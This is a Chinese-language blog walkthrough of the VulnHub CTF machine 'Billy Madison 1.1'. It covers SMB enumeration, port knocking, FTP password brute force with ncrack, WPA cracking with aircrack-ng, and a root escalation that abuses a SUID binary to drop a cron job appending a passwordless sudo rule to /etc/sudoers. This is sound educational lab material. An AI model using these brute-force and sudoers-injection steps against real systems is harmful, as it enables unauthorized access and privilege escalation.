> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/g3pteEiFYm8yT-unaW4Cag)

大余安全  

一个每日分享渗透小技巧的公众号![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPTQKiaXksbZia7PmHLPX2vnCWsznInTj3b9TFYtTDIYG6lDGJZYYSv72NsVWF24Kjlo4MT29tEOQSg/640?wx_fmt=png)

  

  

大家好，这里是 **大余安全** 的第 **43** 篇文章，本公众号会每日分享攻防渗透技术给大家。

![](https://mmbiz.qpic.cn/mmbiz_png/5ria5WVLahGj8W7vu6J2jzTGqRtEaL6ib9CDzENq8PCEZADfU3JXsmibNacJhY7rooNoYIpCsUytNS0k4UcSsnRfw/640?wx_fmt=png)

靶机地址：https://www.vulnhub.com/entry/billy-madison-11,161/

靶机难度：中级（CTF）

靶机发布日期：2016 年 9 月 14 日

靶机描述：

Help Billy Madison stop Eric from taking over Madison Hotels!

Sneaky Eric Gordon has installed malware on Billy's computer right before the two of them are set to face off in an academic decathlon. Unless Billy can regain control of his machine and decrypt his 12th grade final project, he will not graduate from high school. Plus, it means Eric wins, and he takes over as head of Madison Hotels!

目标：得到 root 权限 & 找到 flag.txt

请注意：对于所有这些计算机，我已经使用 VMware 运行下载的计算机。我将使用 Kali Linux 作为解决该 CTF 的攻击者机器。这里使用的技术仅用于学习教育目的，如果列出的技术用于其他任何目标，我概不负责。

![](https://mmbiz.qpic.cn/mmbiz_png/XxZOJAn437TAwOeYFBI2JiamRa34iaqY1IAPG9MaXSIKgPlBicRoyoyHPr0q6YUAhLTYebc4z2qjok0r1riadSujeg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/FAf3SbzREv1yEsWZqMDExrPvhOutWaLH9VkgQiaS11ia5Y3Xun2olnDwIhLlOiaMWe0UGE1uMpeHx4ma7lOjn8xpQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/VtRWAxRvv7GXYcc2w086cwOxcc4libkI8ibn6rD3yBlZ7vd0fH2TaYMKicrgibMcRBbxTQ5fbCJs4AgldkHtBiaPOdA/640?wx_fmt=png)

一、信息收集

![](https://mmbiz.qpic.cn/mmbiz_svg/kSiaeFj92SMyLghhftE2Ls37f4uZP8ZCOxbnsSQ1P6n6AsfOBzt5PrmdTAS3OOhPMXiabAsyKKf4QuEfoCrj9yLNlmkc5ddlpQ/640?wx_fmt=svg)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPYCIkOjR3iaRjffFaiaJj4f4194ia6aoe4IkBuOzwKBP2ecoDZnQhIf1kaOZz3niblLMpzvCm8Bk3DTw/640?wx_fmt=png)  

我们在 VM 中需要确定攻击目标的 IP 地址，需要使用 nmap 获取目标 IP 地址：

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPYCIkOjR3iaRjffFaiaJj4f4IlrV1uG2y0nfj3y3REvfweFoPYxvkH9meClm9zriaJqF3iap9cqhbibVw/640?wx_fmt=png)

我们已经找到了此次 CTF 目标计算机 IP 地址：192.168.56.136

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPYCIkOjR3iaRjffFaiaJj4f4xyzYicGGusZ0VPJMj5DxicCZlflp3ibPibNicMLVrbDBUb3evnicpCxOg6yQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPYCIkOjR3iaRjffFaiaJj4f4c8uSTcrAniaSVjvScewBDcXwcAqEFeZ75TdEIL5KoXssIR7fnz0qqOw/640?wx_fmt=png)

SSH，Telnet，HTTP，Netbios-ssn 和 Microsoft-ds 服务都开放着...

我先测试 smb...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPYCIkOjR3iaRjffFaiaJj4f4JqdoHYpmLCYyZSeJDvmOot0ic3iaeiaG6eC2BKlcGYgp6siaFAeGiaPpE2Q/640?wx_fmt=png)

```
nmap -v --script smb-enum-shares.nse -p445 192.168.56.136
```

使用 nmap 脚本 smb-enum-shares.nse 进行枚举... 发现 EricsSecretStuff 可以匿名访问和写入...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPYCIkOjR3iaRjffFaiaJj4f4PocAbULszKTRAFbV4BOxmyhug231pFHibugfX1pRZGzEX3kTHYhK0kQ/640?wx_fmt=png)

```
smbclient \\\\192.168.56.136\\EricsSecretStuff\\
```

Erics 关闭中... 这条路不通...

SSH 访问也拒绝了...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPYCIkOjR3iaRjffFaiaJj4f4ibGvIytiaP2CRwFh2WeVwZrxOC7IfNeFVpIO5h3bZBbJgdOAvLjjszJg/640?wx_fmt=png)

说曾经使用过 rkfpuzrahngvat 密匙的 ROTten 密码...

ROTten 线索应该是 ROT10 编码，现在 ROT13 是最流行的 ROT 编码... 要解码线索，我使用 tr 命令...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPYCIkOjR3iaRjffFaiaJj4f472e7lXEyibO15Jmvh8NTEB9xlG3I6R1Te0I1CFLKarFlIna8OkQ3VqQ/640?wx_fmt=png)

```
echo rkfpuzrahngvat | tr a-z n-za-m
```

exschmenuating... 结果看起来像是目录或者文件...

curl 试试...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPYCIkOjR3iaRjffFaiaJj4f46LrRRdpndIicN3ibOicQNVV1opvFE9QuOo0DGibXPgZ3LzwHFVOX0lEb8g/640?wx_fmt=png)

```
curl -I http://192.168.56.136/exschmenuating/
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPYCIkOjR3iaRjffFaiaJj4f4mGBHM9SRv2uMumlz33ibJuQiblqmbCWlJVib7dH0yXgv0hEAAcGtM1kyQ/640?wx_fmt=png)

可以看到 veronica 可能是密码一部分的线索...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPYCIkOjR3iaRjffFaiaJj4f4bQdKX26iayJBOHAq3a3tuicjWkzSicgXytYoeyaZdxbAR8s3stnmianHAQ/640?wx_fmt=png)

```
grep 'veronica' /usr/share/wordlists/rockyou.txt > dayu.lst
```

针对单词列表文件 rockyou.txt，过滤掉了 veronica 所有单词... 只剩 773 个...

文件夹中应该有一个. captured 文件，主要以. cap 结尾...veronica 也是文件名的一部分... 用 wfuzz 运行以搜索捕获文件...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPYCIkOjR3iaRjffFaiaJj4f4iaAiaJgkRKic38xic2w2j1hfLZqeP3Xmll2bwrupSsDcWZJFVrAHaPEOIw/640?wx_fmt=png)

```
wfuzz -c --hc=404 -z file,dayu.lst http://192.168.56.136/exschmenuating/FUZZ.cap
```

去下载 012987veronica.cap 这个文件...

```
http://192.168.56.136/exschmenuating/012987veronica.cap
```

... 使用 tcpflow 处理...  

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPYCIkOjR3iaRjffFaiaJj4f4W8AFf3nDxNOygkwDoyNqD89RXZeL9ZCAia6CbC4I5MX4p9Lr2Y0ySicA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPYCIkOjR3iaRjffFaiaJj4f4dge2OXOA4bIZicRbicN2oPPZ6ITj7a8QQG9Gp41AHrS2W5FW0S94fxjA/640?wx_fmt=png)

```
tcpflow -v -r 012987veronica.cap
```

这些文件原来是 Eric 和 Veronica 之间的来往的电子邮件...

cat 查看下他们的内容...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPYCIkOjR3iaRjffFaiaJj4f4paBgBziaEm4J0EEWcd8JlDObue4tghK3WvvbjfhGzkISIialOzvsNgTw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPYCIkOjR3iaRjffFaiaJj4f4xKiaMAOmOTXaiamkDic66DISUoicmSsy98QXcqnc8bF0rX9YW7gplJYfhg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPYCIkOjR3iaRjffFaiaJj4f4YUDiayKO3mjHF9E3jY1SC1LYxkay9yicHTMFI4A4QGiaFrXCltic4koqCw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPYCIkOjR3iaRjffFaiaJj4f4bSlyB2pmBqeNrSSrT1L5nIF8YUzg4pNSzasSDCtL5STPLicibwb3Gib1Q/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPYCIkOjR3iaRjffFaiaJj4f4CWCPuiaMdsIDE5DicxVQzVrNWrVoMgUBOp3s4xjMB0WYnHYR0No9dRbQ/640?wx_fmt=png)

邮件中发现：

```
https://www.youtube.com/watch?v=z5YU7JwVy7s
```

以及 FTP 等信息... 我查看下视频内容...

默认情况下 FTP 是关闭的，需要旁敲端口将其激活，通过查看 Youtube 视频，得到了端口爆震序列：1466, 67, 1469 ,1514, 1981, 1986, 1588...

使用 knock 技术即可实现... 在 NO.27 章里面也解释了...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPYCIkOjR3iaRjffFaiaJj4f4lVQSp3HDA1OekUpjqVpjQGUZQZkYVlhe0ULycJ9PDK0n6jweic6ZGng/640?wx_fmt=png)

```
knock -v 192.168.56.136 1466 67 1469 1514 1981 1986
```

可以看到 FTP 21 端口已经打开了...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPYCIkOjR3iaRjffFaiaJj4f4ZkQaPGQlMsme9yT90XHUgN35eFpciaLJ2NbbFY1hIqHSFEicfC6FrMYg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPYCIkOjR3iaRjffFaiaJj4f422EjFDVhGt8LN9K9YsvynftkkD0LMgZlVGmqMSA6fAYHSwxB4zoYeQ/640?wx_fmt=png)

从 012987veronica.cap 邮件中的信息可以看到，存在 eric/ericdoesntdrinkhisownpee 账号密码... 用它登陆...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPYCIkOjR3iaRjffFaiaJj4f4q16Ydqt5iblWPjH6O2wxs1DpP8VAic0GOESzt3nqb1waREOmAPYmr48A/640?wx_fmt=png)

发现. notes 信息...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPYCIkOjR3iaRjffFaiaJj4f4AGIFGj3LDSEv5CjZrRhATuicVQW7DNkGermxoIFMgQicGRQr1mibKaNQQ/640?wx_fmt=png)

继续发现了视频...

```
https://www.youtube.com/watch?v=6u7RsW5SAgs
```

上面的意思是：新的隐密端口将打开... 存在 Wifi 密码...Veronica 或 Billy 知道密码.... 签入 Veronica 的 FTP 文件夹...

观看了视频...13 秒的视频，念了一句话：My kid will be a soccer player...

最前面可以看到 2525 端口 smtp 是开放的...

按照它的意思登陆 SMTP 发送邮件即可...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPYCIkOjR3iaRjffFaiaJj4f4kicmtMXHFVK4cPrATk0NJJPiasAiaUCruDMmguibniciao0MibM1RQbEpkWFg/640?wx_fmt=png)

按照意思发送了一封邮件过去...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPYCIkOjR3iaRjffFaiaJj4f4mQ62Dc5sV9gjbgfl9icz7KvzOtNuVgv2WAakmSqxK7FbjtW7S7AaQicw/640?wx_fmt=png)

重新连接到 smb 共享文件夹检查了 ebd 文件 open 状态了...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPYCIkOjR3iaRjffFaiaJj4f4v1GaXAe5j3bpn2ba1Qoe7MNFRLcvM8xQQzpmqOs4nwdDB8SEefgEkw/640?wx_fmt=png)

1974 端口也打开了...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPYCIkOjR3iaRjffFaiaJj4f4LpicC8VurGVhzQxfiahaJTQks0GK75n0Ph0wMwsoMafHWRoFXaaHplRA/640?wx_fmt=png)

nmap 更深入的扫发现了 1974 的 ssh 开放着....

前面我说到 Veronica 有 FTP 文件夹存在... 我用 dayu.lst 前面生成的密码表来找密码看看...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPYCIkOjR3iaRjffFaiaJj4f46QSRbgWVq49L2tpKuoIm6cGMWn8SolGOaDAUR7KdicBablyf3C2TlHg/640?wx_fmt=png)

```
ncrack -u veronica -P dayu.lst -T 5 192.168.56.136 -p 21`  （ncrack
ftp: 'veronica' 'babygirl_veronica07@yahoo.com
```

找到了...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPYCIkOjR3iaRjffFaiaJj4f41icibDTE6UN9WU6zlR2RljjhOutDJ43gyK5vdtf5FBnFgjc0lzc3iaQcA/640?wx_fmt=png)

成功登陆...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPYCIkOjR3iaRjffFaiaJj4f4EoUWiakEswyEE4rFQTic2yibAicZgGicboBxy3biasN45W2emXWkJiaibRgqQA/640?wx_fmt=png)

意思是比利想破解 Eric 的无线设备，没成功...

.cap 文件就是流量文件... 流量就像 Wireless traffic 和 eml 文件一样...

这边需要破解 WPA/WPA2 密码，可以用 aircrack-ng 或 hashcat 来完成...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPYCIkOjR3iaRjffFaiaJj4f4E9aS6ZDhJ2OtLA96h3frlc0wdnwPsWuLUwKYlupmt0vImQLVtGhrYw/640?wx_fmt=png)

```
aircrack-ng -w rockyou.txt eg-01.cap
密码是triscuit*
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPYCIkOjR3iaRjffFaiaJj4f4uoxAocjjnH85XIXXBc72cWZpxIuUOJsZnZalNvdRDKHUqaWVj7Hg1g/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/FAf3SbzREv1yEsWZqMDExrPvhOutWaLH9VkgQiaS11ia5Y3Xun2olnDwIhLlOiaMWe0UGE1uMpeHx4ma7lOjn8xpQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/VtRWAxRvv7GXYcc2w086cwOxcc4libkI8ibn6rD3yBlZ7vd0fH2TaYMKicrgibMcRBbxTQ5fbCJs4AgldkHtBiaPOdA/640?wx_fmt=png)

二、提权

![](https://mmbiz.qpic.cn/mmbiz_svg/kSiaeFj92SMyLghhftE2Ls37f4uZP8ZCOxbnsSQ1P6n6AsfOBzt5PrmdTAS3OOhPMXiabAsyKKf4QuEfoCrj9yLNlmkc5ddlpQ/640?wx_fmt=svg)

```
ssh eric@192.168.56.136 -p 1974
```

成功登陆... 真的难，太难了...（aircrack-ng 使用这个得靶机和攻击机子都在外网环境...)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPYCIkOjR3iaRjffFaiaJj4f4IQAAn3WO03BHbhZ8K89Dp8OdWqX94VQOJiaBQfws6Bx3Rqlicp2IX5Zw/640?wx_fmt=png)

无法直接提权... 前面 nmap 扫到的一大串代码应该是存在二进制文件的... 我找下 suid 试试...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPYCIkOjR3iaRjffFaiaJj4f4q33QydV8w3HP3UxktfWBjnicnUpRI2NIeXcTGy0Kic2DicKCOC2e8Fw3A/640?wx_fmt=png)

```
find / -perm -g=s -perm -u=s -type f -ls 2>/dev/null
```

发现 donpcgd 是 root 和 eric 组存在的 SUID 文件...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPYCIkOjR3iaRjffFaiaJj4f4NZ7e7EUcsj0aB0rUBZgqVYqNVYxsicvA1X6FurVrbLFUWQrjRHMRZQQ/640?wx_fmt=png)

有提示... 遇到过... 意思是：该程序会将路径 1 中的文件复制到路径 2（仅名称相同，但是内容不会被复制。新文件为空）

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPYCIkOjR3iaRjffFaiaJj4f4O8D6DtVgVUcMKputtplKnS2U1C9BlO9TeEyh06OZdxw5m6w2Xkxfbw/640?wx_fmt=png)

我在 / tmp 创建了 dayu 文件，然后使用 donpcgd 脚本将该文件放在 / etc/cron.hourly 文件夹中...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPYCIkOjR3iaRjffFaiaJj4f4Ktd5FmyibVIfnpjrKTxsg5VUFic9noticS4ibBk83icBsSMqTJzcE1picaSA/640?wx_fmt=png)

命令：

```
1. touch /tmp/dayu
 2. /usr/local/share/sgml/donpcgd /tmp/dayu /etc/cron.hourly/dayu
 3. echo -e '#!/bin/bash\n echo "eric ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers' > /etc/cron.hourly/dayu
 4. chmod +x /etc/cron.hourly/dayu
```

使用 cron.hourly 文件夹中的文件，我添加了一些将允许 eric sudo 访问的代码...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPYCIkOjR3iaRjffFaiaJj4f4MibtRiajKTzqT6F4qReOZHENGkmezkiaCWxEtFbYJCEjBDZDv9XxlOf7g/640?wx_fmt=png)

大约等了快一个小时，donpcgd 脚本自动跑了一遍，提权成功...

这边还是需要找回比利的文件...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPYCIkOjR3iaRjffFaiaJj4f4vztm9k7PGng2EUUKHhZtMJPVgLu296HFwwDc25MIvjShnibSJPuS3Fw/640?wx_fmt=png)

浏览了挺久，在 PRIVATE 目录发现了两个有用的文件...BowelMovement 的文件和一个 hint.txt 文件...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPYCIkOjR3iaRjffFaiaJj4f4gdnGOUBdibWxU6eyNdNDAEE8Zbo3gB7VLxM4BHkIliawth9IaAYmNG7w/640?wx_fmt=png)

该文件最喜欢的是 truecrypt 存档，通过上面的链接使用 cewl 创建一个单词列表，该单词列表将用于查找安装归档文件所需的密码...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPYCIkOjR3iaRjffFaiaJj4f4WPAbVkSFib1zx7DQhnLyRicaIwnMnWkic0tJsOmQz4QBPlHicLicxia3m97Q/640?wx_fmt=png)

```
cewl -d 1 -w truecrack.lst https://en.wikipedia.org/wiki/Billy_Madison
```

通过链接，用 cewl 可以生成一个单词表...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPYCIkOjR3iaRjffFaiaJj4f4gcq6rGnuGMsnXLpcRqiaantwFJb6axIBbgU0Mjc68icjs26wFrVB5uTQ/640?wx_fmt=png)

```
truecrack -v -t BowelMovement -w truecrack.lst
```

Truecrack 与我使用 cewl 创建的单词表结合使用...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPYCIkOjR3iaRjffFaiaJj4f4wDQYzTxjomRE1JLYqGD9JmibibJybwibBuVxXxkFibblUicya3tBLOHWkkw/640?wx_fmt=png)

```
密码是：execrable
```

这边需要安装 veracrypt   

```
[安装教学链接](https://www.youtube.com/watch?v=0yT885ITJPU)
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPYCIkOjR3iaRjffFaiaJj4f4JEHTjRg98af5XxnOkcADOXiaX8NRP6rYia2QFAxrGneXul3kx2yctxVg/640?wx_fmt=png)

看到一个名为 secret.zip 的文件并将其解压缩...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPYCIkOjR3iaRjffFaiaJj4f4DLMzgLaXviavl5umsyLPcB1sTrRvhqoibbB8ucCkbvvVgH3YXNo2odDQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPYCIkOjR3iaRjffFaiaJj4f4NW7Eib6uRVX5K79VyL8dP0HMcbsPZSGhazOkdS6a2lsjAooyDZHhgQw/640?wx_fmt=png)

完成...

![](https://mmbiz.qpic.cn/mmbiz_png/5ria5WVLahGj8W7vu6J2jzTGqRtEaL6ib9CDzENq8PCEZADfU3JXsmibNacJhY7rooNoYIpCsUytNS0k4UcSsnRfw/640?wx_fmt=png)

写完这篇，我脑子快烧了，完全就是跟着作者的意思走... 这台靶机逻辑性比较强.. 最后我要花时间去脑补下 veracrypt 这个工具...

由于我们已经成功得到 root 权限查看 flag，因此完成了简单靶机，希望你们喜欢这台机器，请继续关注大余后期会有更多具有挑战性的机器，一起练习学习。

如果你有其他的方法，欢迎留言。要是有写错了的地方，请你一定要告诉我。要是你觉得这篇博客写的还不错，欢迎分享给身边的人。

![](https://mmbiz.qpic.cn/mmbiz_png/XxZOJAn437TAwOeYFBI2JiamRa34iaqY1IAPG9MaXSIKgPlBicRoyoyHPr0q6YUAhLTYebc4z2qjok0r1riadSujeg/640?wx_fmt=png)

如果觉得这篇文章对你有帮助，可以转发到朋友圈，谢谢小伙伴~

![](https://mmbiz.qpic.cn/mmbiz_png/c5xrRn4430AnqkfAJc38Vpnc5XiaADLTjiciciaibYU4EHw3Nuh7YMtuB0hz3sb8Em9iatt5skAsibuuysPLdLY5LtWOw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/p3lIbvldZiabdI5iaCb3icRhtygUuo2sp6Hcdq0ANlpy5W3gL628uq032jsoVnGnl6HdGrgDXjfazFtkp6IInibDdQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPqjaFWwyrrhiciahSpOibxqKvSIFX0iaPcG00CjYIwQDwIDeIicmFMlOVNyhWYVSE8pJK566UK3YOUNWQ/640?wx_fmt=png)

欢迎加入渗透学习交流群，想入群的小伙伴们加我微信，共同进步共同成长！

![](https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png)  

大余安全

一个全栈渗透小技巧的公众号

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPTQKiaXksbZia7PmHLPX2vnCSsnsc7MHh257oYRic1MOT8qibABNUEnTq9DUL7QBwnS52EheJf4m8iaTQ/640?wx_fmt=png)